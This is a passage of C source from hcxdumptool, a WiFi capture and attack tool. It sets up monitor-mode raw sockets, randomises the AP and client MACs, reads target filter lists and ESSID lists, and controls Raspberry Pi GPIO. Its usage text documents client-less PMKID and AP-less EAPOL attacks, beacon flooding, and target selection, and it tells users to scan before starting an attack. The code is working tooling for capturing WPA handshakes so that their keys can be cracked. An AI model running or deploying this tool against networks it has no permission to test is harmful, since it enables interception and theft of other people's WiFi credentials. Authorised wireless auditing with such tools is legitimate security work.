strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0)
	{
	perror("failed to get SIOCGIFINDEX, ioctl(SIOCGIFINDEX) not supported by driver");
	return false;
	}

memset(&ll, 0, sizeof(ll));
ll.sll_family = PF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
ll.sll_halen = ETH_ALEN;
ll.sll_pkttype = PACKET_OTHERHOST | PACKET_OUTGOING;
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0)
	{
	perror("failed to bind socket");
	return false;
	}

memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = ifr.ifr_ifindex;
mr.mr_type = PACKET_MR_PROMISC;
if(setsockopt(fd_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0)
	{
	perror("failed to set setsockopt(PACKET_MR_PROMISC)");
	return false;
	}

epmaddr = (struct ethtool_perm_addr*)calloc(1, sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	return false;
	}
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ -1);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	return false;
	}
if(epmaddr->size != 6)
	{
	fprintf(stderr, "failed to get permanent hardware address length\n");
	return false;
	}
memcpy(&mac_orig, epmaddr->data, 6);
free(epmaddr);

memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, interfacename, IFNAMSIZ -1);
drvinfo.cmd = ETHTOOL_GDRVINFO;
ifr.ifr_data = (char*)&drvinfo;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	return false;
	}
memcpy(&drivername, drvinfo.driver, 32);
memcpy(&driverversion, drvinfo.version, 32);
memcpy(&driverfwversion, drvinfo.fw_version, ETHTOOL_FWVERS_LEN);
return true;
}
/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
static char *ptr;

ptr = buffer +len -1;
while(len)
	{
	if (*ptr != '\n') break;
	*ptr-- = 0;
	len--;
	}
while(len)
	{
	if (*ptr != '\r') break;
	*ptr-- = 0;
	len--;
	}
return len;
}
/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE *inputstream, size_t size, char *buffer)
{
static size_t len;
static char *buffptr;

if(feof(inputstream)) return -1;
buffptr = fgets (buffer, size, inputstream);
if(buffptr == NULL) return -1;
len = strlen(buffptr);
len = chop(buffptr, len);
return len;
}
/*===========================================================================*/
static inline void readextbeaconlist(char *listname)
{
static int len;
static FILE *fh_extbeacon;
static maclist_t *zeiger;

static char linein[ESSID_LEN_MAX];

if((fh_extbeacon = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open beacon list %s\n", listname);
	return;
	}

zeiger = aplist;
beaconextlistlen = 0;
gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec -512;
while(beaconextlistlen < BEACONEXTLIST_MAX)
	{
	if((len = fgetline(fh_extbeacon, ESSID_LEN_MAX, linein)) == -1) break;
	if((len == 0) || (len > 32)) continue;
	memset(zeiger, 0, MACLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->count = 1;
	memcpy(zeiger->addr, &mac_myap, 3);
	zeiger->addr[3] = (mynic_ap >> 16) & 0xff;
	zeiger->addr[4] = (mynic_ap >> 8) & 0xff;
	zeiger->addr[5] = mynic_ap & 0xff;
	mynic_ap++;
	zeiger->essidlen = len;
	memcpy(zeiger->essid, linein, len);
	timestamp++;
	zeiger++;
	beaconextlistlen++;
	}
fclose(fh_extbeacon);
return;
}
/*===========================================================================*/
static inline int readfilterlist(char *listname, filterlist_t *filterlist)
{
static int len;
static int c;
static int entries;
static filterlist_t *zeiger;
static FILE *fh_filter;

static char linein[FILTERLIST_LINE_LEN];

if((fh_filter = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open filter list %s\n", listname);
	return 0;
	}

entries = 0;
c = 0;
zeiger = filterlist;
while(entries < FILTERLIST_MAX)
	{
	if((len = fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1) break;
	if(len < 12)
		{
		c++;
		continue;
		}
	if(linein[0x0] == '#')
		{
		c++;
		continue;
		}
	if(hex2bin(&linein[0x0], zeiger->mac, 6) == true)
		{
		zeiger++;
		entries++;
		}
	else fprintf(stderr, "failed to read filter list line %d: %s\n", c, linein);
	c++;
	}
qsort(filterlist, entries, FILTERLIST_SIZE, sort_filterlist_by_mac); 
fclose(fh_filter);
return entries;
}
/*===========================================================================*/
static bool initgpio(int gpioperi)
{
static int fd_mem;

fd_mem = open("/dev/mem", O_RDWR|O_SYNC);
if(fd_mem < 0)
	{
	fprintf(stderr, "failed to get device memory\n");
	return false;
	}

gpio_map = mmap(NULL, BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, GPIO_BASE +gpioperi);
close(fd_mem);

if(gpio_map == MAP_FAILED)
	{
	fprintf(stderr, "failed to map GPIO memory\n");
	return false;
	}

gpio = (volatile unsigned *)gpio_map;
return true;
}
/*===========================================================================*/
static int getrpirev()
{
static FILE *fh_rpi;
static int len;
static int rpi = 0;
static int rev = 0;
static int gpioperibase = 0;
static char *revptr = NULL;
static const char *revstr = "Revision";
static const char *hwstr = "Hardware";
static const char *snstr = "Serial";
static char linein[128];

fh_rpi = fopen("/proc/cpuinfo", "r");
if(fh_rpi == NULL)
	{
	perror("failed to retrieve cpuinfo");
	return gpioperibase;
	}

while(1)
	{
	if((len = fgetline(fh_rpi, 128, linein)) == -1) break;
	if(len < 15) continue;
	if(memcmp(&linein, hwstr, 8) == 0)
		{
		rpi |= 1;
		continue;
		}
	if(memcmp(&linein, revstr, 8) == 0)
		{
		rpirevision = strtol(&linein[len -6], &revptr, 16);
		if((revptr - linein) == len)
			{
			rev = (rpirevision >> 4) &0xff;
			if(rev <= 3)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x09)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if(rev == 0x0c)
				{
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
				continue;
				}
			if((rev == 0x04) || (rev == 0x08) || (rev == 0x0d) || (rev == 0x0e) || (rev == 0x11))
				{
				gpioperibase = GPIO_PERI_BASE_NEW;
				rpi |= 2;
				continue;
				}
			continue;
			}
		rpirevision = strtol(&linein[len -4], &revptr, 16);
		if((revptr - linein) == len)
			{
			if((rpirevision < 0x02) || (rpirevision > 0x15)) continue;
			if((rpirevision == 0x11) || (rpirevision == 0x14)) continue;
			gpioperibase = GPIO_PERI_BASE_OLD;
			rpi |= 2;
			}
		continue;
		}
	if(memcmp(&linein, snstr, 6) == 0)
		{
		rpi |= 4;
		continue;
		}
	}
fclose(fh_rpi);
if(rpi < 0x7) return 0;
return gpioperibase;
}
/*===========================================================================*/
static bool ischannelindefaultlist(uint8_t userchannel)
{
static uint8_t cpd;
cpd = 0;
while(channeldefaultlist[cpd] != 0)
	{
	if(userchannel == channeldefaultlist[cpd]) return true;
	cpd++;
	}
return false;
}
/*===========================================================================*/
static inline bool processuserscanlist(char *optarglist)
{
static char *ptr;
static char *userscanlist;

userscanlist = strdupa(optarglist);
cpa = 0;
ptr = strtok(userscanlist, ",");
while(ptr != NULL)
	{
	channelscanlist[cpa] = atoi(ptr);
	if(ischannelindefaultlist(channelscanlist[cpa]) == false) return false;
	ptr = strtok(NULL, ",");
	cpa++;
	if(cpa > 127) return false;
	}
channelscanlist[cpa] = 0;
cpa = 0;
return true;
}
/*===========================================================================*/
static void show_channels()
{
static int c;
static int res;
static struct iwreq pwrq;
static int frequency;
static int testchannel;

fprintf(stdout, "available channels:\n");
for(c = 0; c < 256; c++)
	{
	testchannel = 0;
	frequency = 0;
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = c;
	res = ioctl(fd_socket, SIOCSIWFREQ, &pwrq);
	if(res >= 0)
		{
		memset(&pwrq, 0, sizeof(pwrq));
		strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
		pwrq.u.freq.e = 0;
		pwrq.u.freq.flags = IW_FREQ_FIXED;
		res = ioctl(fd_socket, SIOCGIWFREQ, &pwrq);
		if(res >= 0)
			{
			frequency = pwrq.u.freq.m;
			if(frequency > 100000) frequency /= 100000;
			if(frequency < 1000) testchannel = frequency;
			else if((frequency >= 2407) && (frequency <= 2474)) testchannel = (frequency -2407)/5;
			else if((frequency >= 2481) && (frequency <= 2487)) testchannel = (frequency -2412)/5;
			else if((frequency >= 5150) && (frequency <= 5875)) testchannel = (frequency -5000)/5;
			if(testchannel > 0)
				{
				memset(&pwrq, 0, sizeof(pwrq));
				strncpy( pwrq.ifr_name, interfacename, IFNAMSIZ -1);
				pwrq.u.txpower.value = -1;
				pwrq.u.txpower.fixed = 1;
				pwrq.u.txpower.disabled = 0;
				pwrq.u.txpower.flags = IW_TXPOW_DBM;
				if(ioctl(fd_socket, SIOCGIWTXPOW, &pwrq) < 0)
					{
					if(testchannel == frequency) fprintf(stdout, " %3d\n", testchannel);
					else fprintf(stdout, " %3d / %4dMHz\n", testchannel, frequency);
					}
				else
					{
					if(pwrq.u.txpower.value > 0)
						{
						if(testchannel == frequency) fprintf(stdout, "%3d (%2d dBm)\n",testchannel, pwrq.u.txpower.value);
						else fprintf(stdout, "%3d / %4dMHz (%2d dBm)\n",testchannel, frequency, pwrq.u.txpower.value);
						}
					}
				}
			}
		}
	}
return;
}
/*===========================================================================*/
static bool get_perm_addr(char *ifname, uint8_t *permaddr, char *drivername)
{
static int fd_info;
static struct iwreq iwr;
static struct ifreq ifr;
static struct ethtool_perm_addr *epmaddr;
static struct ethtool_drvinfo drvinfo;

if((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
	perror( "socket info failed" );
	return false;
	}

memset(&iwr, 0, sizeof(iwr));
strncpy(iwr.ifr_name, ifname, IFNAMSIZ -1);
if(ioctl(fd_info, SIOCGIWNAME, &iwr) < 0)
	{
#ifdef DEBUG
	printf("testing %s %s\n", ifname, drivername);
	perror("not a wireless interface");
#endif
	close(fd_info);
	return false;
	}

epmaddr = (struct ethtool_perm_addr *) malloc(sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr)
	{
	perror("failed to malloc memory for permanent hardware address");
	close(fd_info);
	return false;
	}

memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ -1);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get permanent hardware address, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
if(epmaddr->size != 6)
	{
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(permaddr, epmaddr->data, 6);

memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ -1);
drvinfo.cmd = ETHTOOL_GDRVINFO;
ifr.ifr_data = (char*)&drvinfo;
if(ioctl(fd_info, SIOCETHTOOL, &ifr) < 0)
	{
	perror("failed to get driver information, ioctl(SIOCETHTOOL) not supported by driver");
	free(epmaddr);
	close(fd_info);
	return false;
	}
memcpy(drivername, drvinfo.driver, 32);
free(epmaddr);
close(fd_info);
return true;
}
/*===========================================================================*/
static void show_wlaninterfaces()
{
static int p;
static struct ifaddrs *ifaddr = NULL;
static struct ifaddrs *ifa = NULL;
static uint8_t permaddr[6];
static char drivername[32];

if(getifaddrs(&ifaddr) == -1) perror("failed to get ifaddrs");
else
	{
	printf("wlan interfaces:\n");
	for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			memset(&drivername, 0, 32);
			if(get_perm_addr(ifa->ifa_name, permaddr, drivername) == true)
				{
				for (p = 0; p < 6; p++) printf("%02x", (permaddr[p]));
				if(checkmonitorinterface(ifa->ifa_name) == false) printf(" %s (%s)\n", ifa->ifa_name, drivername);
				else printf(" %s (%s)  warning: probably a monitor interface!\n", ifa->ifa_name, drivername);
				}
			}
		}
	freeifaddrs(ifaddr);
	}
return;
}
/*===========================================================================*/
static inline bool globalinit()
{
static int c;
static int gpiobasemem = 0;
static const char notavailable[] = { "N/A" };
static const char weakcandidatedefault[] = { "12345678" };

fd_socket_mccli = 0;
fd_socket_mcsrv = 0;
srand(time(NULL));
rpirevision = 0;
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
sleepled2.tv_sec = 0;
sleepled2.tv_nsec = GPIO_LED_DELAY +GPIO_LED_DELAY;
if((gpiobutton > 0) || (gpiostatusled > 0))
	{
	if(gpiobutton == gpiostatusled)
		{
		fprintf(stderr, "same value for wpi_button and wpi_statusled is not allowed\n");
		return false;
		}
	gpiobasemem = getrpirev();
	if(gpiobasemem == 0)
		{
		fprintf(stderr, "failed to locate GPIO\n");
		return false;
		}
	if(initgpio(gpiobasemem) == false)
		{
		fprintf(stderr, "failed to init GPIO\n");
		return false;
		}
	if(gpiostatusled > 0)
		{
		INP_GPIO(gpiostatusled);
		OUT_GPIO(gpiostatusled);
		}
	if(gpiobutton > 0)
		{
		INP_GPIO(gpiobutton);
		}
	}
if(gpiostatusled > 0)
	{
	for (c = 0; c < 5; c++)
		{
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled2, NULL);
		}
	}

if((aplist = (maclist_t*)calloc((MACLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
beaconintptr = aplist;
if((clientlist = (maclist_t*)calloc((MACLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
if((handshakelist = (handshakelist_t*)calloc((HANDSHAKELIST_MAX +1), HANDSHAKELIST_SIZE)) == NULL) return false;
if((scanlist = (scanlist_t*)calloc((SCANLIST_MAX +1), SCANLIST_SIZE)) == NULL) return false;
if((filteraplist = (filterlist_t*)calloc((FILTERLIST_MAX +1), FILTERLIST_SIZE)) == NULL) return false;
if((filterclientlist = (filterlist_t*)calloc((FILTERLIST_MAX +1), FILTERLIST_SIZE)) == NULL) return false;

if(macmyapflag == false)
	{
	myoui_ap = myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))];
	mynic_ap = rand() & 0xffffff;
	myoui_ap &= 0xfcffff;
	}
mac_myap[5] = mynic_ap & 0xff;
mac_myap[4] = (mynic_ap >> 8) & 0xff;
mac_myap[3] = (mynic_ap >> 16) & 0xff;
mac_myap[2] = myoui_ap & 0xff;
mac_myap[1] = (myoui_ap >> 8) & 0xff;
mac_myap[0] = (myoui_ap >> 16) & 0xff;

if(macmyclientflag == false)
	{
	if(myoui_client == 0) myoui_client = myvendorclient[rand() %((MYVENDORCLIENT_SIZE /sizeof(int)))];
	myoui_client &= 0xffffff;
	mac_myclient[5] = rand() & 0xff;
	mac_myclient[4] = rand() & 0xff;
	mac_myclient[3] = rand() & 0xff;
	mac_myclient[2] = myoui_client & 0xff;
	mac_myclient[1] = (myoui_client >> 8) &0xff;
	mac_myclient[0] = (myoui_client >> 16) &0xff;
	}

for(c = 0; c < 32; c++)
	{
	myanonce[c] = rand() %0xff;
	mysnonce[c] = rand() %0xff;
	}
myrc = (rand()%0xfff) +0xf000;

myclientsequence = 1;
myreactivebeaconsequence = 1;
myapsequence = 1;
myapsequence = 1;
mydeauthenticationsequence = 1;
mydisassociationsequence = 1;
myclientsequence = 1;
mytime = 1;
filteraplistentries = 0;
filterclientlistentries = 0;

nmealen = 0;
memset(&nmeatempsentence, 0, NMEA_MAX);
memset(&nmeasentence, 0, NMEA_MAX);
memcpy(&nmeasentence, &notavailable, 3);

weakcandidatelen = 8;
memset(&weakcandidate, 0, 64);
memcpy(&weakcandidate, weakcandidatedefault, 8);

gettimeofday(&tv, NULL);
tvold.tv_sec = tvold.tv_sec;
tvold.tv_usec = tvold.tv_usec;
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
wantstopflag = false;

errorcount = 0;
incommingcount = 0;
outgoingcount = 0;
pmkidcount = 0;
eapolmpcount = 0;
gpscount = 0;
ringbuffercount = 0;

signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
printf("%s %s  (C) %s ZeroBeat\n"
	"usage  : %s <options>\n"
	"         press the switch to terminate hcxdumptool\n"
	"         hardware modification is necessary, read more:\n"
	"         https://github.com/ZerBea/hcxdumptool/tree/master/docs\n" 
	"example: %s -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status=3\n"
	"         do not run hcxdumptool on logical interfaces (monx, wlanxmon)\n"
	"         do not use hcxdumptool in combination with other 3rd party tools, which take access to the interface\n"
	"\n"
	"short options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxdumptool)\n"
	"                 can also be done manually:\n"
	"                 ip link set <interface> down\n"
	"                 iw dev <interface> set type monitor\n"
	"                 ip link set <interface> up\n"
	"                 WARNING: iw use netlink (libnl) and hcxdumptool will not work on pure netlink interfaces\n"
	"-o <dump file> : output file in pcapng format\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-f <frames     : frames to save\n"
	"                 bitmask:\n"
	"                  0: clear default values\n"
	"                  1: MANAGEMENT frames (default)\n"
	"                  2: EAP/EAPOL frames (default)\n"
	"                  4: IPV4 frames\n"
	"                  8: IPV6 frames\n"
	"                 16: WEP encrypted frames\n"
	"                 32: WPA encrypted frames\n"
	"                 to clear default values use -f 0 first, followed by desired frame type\n"
	"-c <digit>     : set scan list (1,2,3, ...)\n"
	"                 default scan list: 1...13\n"
	"                 maximum entries: 127\n"
	"                 allowed channels (depends on the device):\n"
	"                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n"
	"                 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68, 96\n"
	"                 100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128\n"
	"                 132, 134, 136, 138, 140, 142, 144, 149, 151, 153, 155, 157, 159\n"
	"                 161, 165, 169, 173\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default %d seconds\n"
	"-I             : show wlan interfaces and quit\n"
	"-C             : show available channels and quit\n"
	"                 if no channels are available, interface is probably in use or doesn't support monitor mode\n"
	"\n"
	"long options:\n"
	"--do_rcascan                       : show radio channel assignment (scan for target access points)\n"
	"                                     this can be used to test that ioctl() calls and packet injection is working\n"
	"                                     if you got no HIT, packet injection is possible not working\n"
	"                                     also it can be used to get information about the target\n"
	"                                     and to determine that the target is in range\n"
	"                                     use this mode to collect data for the filter list\n"
	"                                     run this mode at least for 2 minutes\n"
	"                                     to save all received raw packets use option -o\n"
	"--disable_client_attacks           : do not attack clients\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"--disable_ap_attacks               : do not attack access points\n"
	"                                     affected: client-less (PMKID) attack\n"
	"--silent                           : do not transmit!\n"
	"                                     hcxdumptool is acting like a passive dumper\n"
	"--eapoltimeout=<digit>             : set EAPOL TIMEOUT (milliseconds)\n"
	"                                     default: %d ms\n"
	"--filterlist_ap=<file>             : ACCESS POINT MAC filter list\n"
	"                                     format: 112233445566 + comment\n"
	"                                     maximum entries %d\n"
	"                                     run first --do_rcascan to retrieve information about the target\n"
	"--filterlist_client=<file>         : CLIENT MAC filter list\n"
	"                                     format: 112233445566 # comment\n"
	"                                     maximum entries %d\n"
	"                                     run first --do_rcascan to retrieve information about the target\n"
	"--filtermode=<digit>               : mode for filter list\n"
	"                                     1: use filter list as protection list (default) in transmission branch\n"
	"                                        receive everything, interact with all ACCESS POINTs and CLIENTs in range,\n"
	"                                        except(!) the ones from the filter lists\n"
	"                                     2: use filter list as target list in transmission branch\n"
	"                                        receive everything, only interact with ACCESS POINTs and CLIENTs in range,\n"
	"                                        from the filter lists\n"
	"--weakcandidate=<password>         : use this pre shared key (8...63 characters) for weak candidate alert\n"
	"                                     will be saved to pcapng to inform hcxpcaptool\n"
	"                                     default: %s\n"
	"--mac_ap                           : use this MAC as ACCESS POINT MAC instead of a randomized one\n"
	"                                     format: 112233445566\n"
	"--mac_client                       : use this MAC as CLIENT MAC instead of a randomized one\n"
	"                                     format: 112233445566\n"
	"--essidlist=<file>                 : transmit beacons from this ESSID list\n"
	"                                     maximum entries: %d ESSIDs\n"
	"--reactive_beacon                  : transmit beacon on every received proberequest\n"
	"                                     affected: ap-less\n"
	"--active_beacon                    : transmit beacon once a second\n"
	"                                     affected: ap-less\n"
	"--flood_beacon                     : transmit beacon on every received beacon\n"
	"                                     affected: ap-less\n"
	"--use_gps_device=<device>          : use GPS device\n"
	"                                     /dev/ttyACM0, /dev/ttyUSB0, ...\n"
	"                                     NMEA 0183 $GPGGA $GPGGA\n"
	"--use_gpsd                         : use GPSD device\n"
	"                                     NMEA 0183 $GPGGA, $GPRMC\n"
	"--nmea=<file>                      : save track to file\n"
	"                                     format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL\n"
	"                                     to convert it to gpx, use GPSBabel:\n"
	"                                     gpsbabel -i nmea -f hcxdumptool.nmea -o gpx -F file.gpx\n"
	"                                     to display the track, open file.gpx with viking\n"
	"--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--tot=<digit>                      : enable timeout timer in minutes (minimum = 2 minutes)\n"
	"                                   : hcxdumptool will terminate if tot reached (EXIT code = 2)\n"
	"--reboot                           : once hcxdumptool terminated, reboot system\n"
	"--poweroff                         : once hcxdumptool terminated, power off system\n"
	"--enable_status=<digit>            : enable real-time display (waterfall)\n"
	"                                     some messages ​​are shown only once at the first occurrence\n"
	"                                     bitmask:\n"
	"                                       0: no status (default)\n"
	"                                       1: EAPOL\n"
	"                                       2: PROBE REQUEST/PROBE RESPONSE\n"
	"                                       4: AUTHENTICATON\n"
	"                                       8: ASSOCIATION/REASSOCIATION\n"
	"                                      16: BEACON\n"
	"                                      32: GPS (once a minute)\n"
	"                                      64: internal status\n"
	"                                     128: run as server\n"
	"                                     256: run as client\n"
	"                                     example: show EAPOL and PROBEREQUEST/PROBERESPONSE (2+4 = 6)\n"
	"--server_port=<digit>              : define port for server status output (1...65535)\n"
	"                                   : default IP: %s\n"
	"                                   : default port: %d\n"
	"--client_port=<digit>              : define port for client status read (1...65535)\n"
	"                                   : default IP: %s\n"
	"                                   : default port: %d\n"
	"--check_driver                     : run several tests to determine that driver support all(!) required ioctl() system calls\n" 
	"--help                             : show this help\n"
	"--version                          : show version\n"
	"\n"
	"Run hcxdumptool -i interface --do_rcascan for at least 30 seconds, before you start an attack!\n"
	"Do not edit, merge or convert this pcapng files, because it will remove optional comment fields!\n"
	"It is much better to run gzip to compress the files. Wireshark, tshark and hcxpcapngtool will understand this.\n"
	"If hcxdumptool captured your password from WiFi traffic, you should check all your devices immediately!\n"
	"If you use GPS, make sure GPS device is in fix, before you start hcxdumptool\n"
	"\n",
	eigenname, VERSION, VERSION_JAHR, eigenname, eigenname,
	STAYTIME, EAPOLTIMEOUT /10000, BEACONEXTLIST_MAX, FILTERLIST_MAX, weakcandidate, FILTERLIST_MAX, MCHOST, MCPORT, MCHOST, MCPORT);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static long int totvalue;
static int mccliport;
static int mcsrvport;
static int weakcandidatelenuser;
static bool rcascanflag;
static bool checkdriverflag;
static bool showinterfaceflag;
static bool showchannelsflag;

static char *filteraplistname;
static char *filterclientlistname;
static char *extaplistname;
static char *nmeaoutname;
static char *weakcandidateuser;

static const char *short_options = "i:o:f:c:t:IChv";
static const struct option long_options[] =
{
	{"do_rcascan",			no_argument,		NULL,	HCX_DO_RCASCAN},
	{"disable_ap_attacks",		no_argument,		NULL,	HCX_DISABLE_AP_ATTACKS},
	{"disable_client_attacks",	no_argument,		NULL,	HCX_DISABLE_CLIENT_ATTACKS},
	{"silent",			no_argument,		NULL,	HCX_SILENT},
	{"filterlist_ap",		required_argument,	NULL,	HCX_FILTERLIST_AP},
	{"filterlist_client",		required_argument,	NULL,	HCX_FILTERLIST_CLIENT},
	{"filtermode	",		required_argument,	NULL,	HCX_FILTERMODE},
	{"weakcandidate	",		required_argument,	NULL,	HCX_WEAKCANDIDATE},
	{"mac_ap",			required_argument,	NULL,	HCX_MAC_AP},
	{"mac_client",			required_argument,	NULL,	HCX_MAC_CLIENT},
	{"eapoltimeout",		required_argument,	NULL,	HCX_EAPOL_TIMEOUT},
	{"reactive_beacon",		no_argument,		NULL,	HCX_REACTIVE_BEACON},
	{"active_beacon",		no_argument,		NULL,	HCX_ACTIVE_BEACON},
	{"flood_beacon",		no_argument,		NULL,	HCX_FLOOD_BEACON},
	{"essidlist",			required_argument,	NULL,	HCX_EXTAP_BEACON},
	{"use_gps_device",		required_argument,	NULL,	HCX_GPS_DEVICE},
	{"use_gpsd",			no_argument,		NULL,	HCX_GPSD},
	{"nmea",			required_argument,	NULL,	HCX_NMEA_NAME},
	{"gpio_button",			required_argument,	NULL,	HCX_GPIO_BUTTON},
	{"gpio_statusled",		required_argument,	NULL,	HCX_GPIO_STATUSLED},
	{"tot",				required_argument,	NULL,	HCX_TOT},
	{"reboot",			no_argument,		NULL,	HCX_REBOOT},
	{"poweroff",			no_argument,		NULL,	HCX_POWER_OFF},
	{"enable_status",		required_argument,	NULL,	HCX_STATUS},
	{"server_port",			required_argument,	NULL,	HCX_SERVER_PORT},
	{"client_port",			required_argument,	NULL,	HCX_CLIENT_PORT},
	{"check_driver",		no_argument,		NULL,	HCX_CHECK_DRIVER},
	{"version",			no_argument,		NULL,	HCX_VERSION},
	{"help",			no_argument,		NULL,	HCX_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;
interfacename = NULL;
pcapngoutname = NULL;
filteraplistname = NULL;
filterclientlistname = NULL;
extaplistname = NULL;
gpsname = NULL;
nmeaoutname = NULL;
weakcandidateuser = NULL;
weakcandidatelenuser = 0;
errorcount = 0;
maxerrorcount = ERROR_MAX;
pcapngframesout = PCAPNG_FRAME_DEFAULT;
fh_nmea = NULL;
fd_pcapng = 0;
cpa = 0;
staytime = STAYTIME;
myoui_client = 0;
rcascanflag = false;
beaconreactiveflag = false;
beaconactiveflag = false;
beaconfloodflag = false;
checkdriverflag = false;
showinterfaceflag = false;
showchannelsflag = false;
totflag = false;
gpsdflag = false;
macmyapflag = false;
macmyclientflag = false;
statusout = 0;
attackstatus = 0;
filtermode = 0;
mccliport = MCPORT;
mcsrvport = MCPORT;
tvtot.tv_sec = 2147483647L;
tvtot.tv_usec = 0;
eapoltimeoutvalue = EAPOLTIMEOUT;
while((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCX_INTERFACE_NAME:
		interfacename = optarg;
		break;

		case HCX_GPS_DEVICE:
		gpsname = optarg;
		gpsdflag = false;
		break;

		case HCX_GPSD:
		gpsname = NULL;
		gpsdflag = true;
		break;

		case HCX_NMEA_NAME:
		nmeaoutname = optarg;
		break;

		case HCX_CHANNEL:
		if(processuserscanlist(optarg) == false)
			{
			fprintf(stderr, "unknown channel selected\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_STAYTIME:
		if(strtol(optarg, NULL, 10) == 0)
			{
			fprintf(stderr, "stay time must be greater than 0\n");
			exit (EXIT_FAILURE);
			}
		staytime = strtol(optarg, NULL, 10);
		break;

		case HCX_PCAPNG_NAME:
		pcapngoutname = optarg;
		break;

		case HCX_PACPNG_FRAMES:
		if(strtol(optarg, NULL, 10) == 0) pcapngframesout = strtol(optarg, NULL, 10);
		else pcapngframesout |= strtol(optarg, NULL, 10);
		break;

		case HCX_DO_RCASCAN:
		rcascanflag = true;
		break;

		case HCX_DISABLE_AP_ATTACKS:
		attackstatus |= DISABLE_AP_ATTACKS;
		break;

		case HCX_DISABLE_CLIENT_ATTACKS:
		attackstatus |= DISABLE_CLIENT_ATTACKS;
		break;

		case HCX_SILENT:
		attackstatus |= DISABLE_AP_ATTACKS;
